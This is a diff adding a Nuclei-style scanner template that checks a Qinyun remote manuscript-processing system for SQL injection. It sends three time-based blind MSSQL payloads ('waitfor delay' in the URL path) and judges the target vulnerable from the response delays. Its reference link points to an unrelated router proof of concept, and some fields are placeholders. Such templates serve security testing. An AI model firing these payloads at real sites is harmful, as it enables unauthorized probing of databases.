@@ -1,0 +1,25 @@
+id: qykj-sqli
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 勤云远程稿件处理系统存在SQL注入漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%A3%9E%E9%B1%BC%E6%98%9F/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/burpsuite'if%20db_name(1)='master'%20waitfor%20delay%20'0:0:3'--/article/abstract/1"
+      - "{{BaseURL}}/burpsuite'if%20db_name(1)='master'%20waitfor%20delay%20'0:0:6'--/article/abstract/1"
+      - "{{BaseURL}}/burpsuite'if%20db_name(1)='master'%20waitfor%20delay%20'0:0:9'--/article/abstract/1"
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
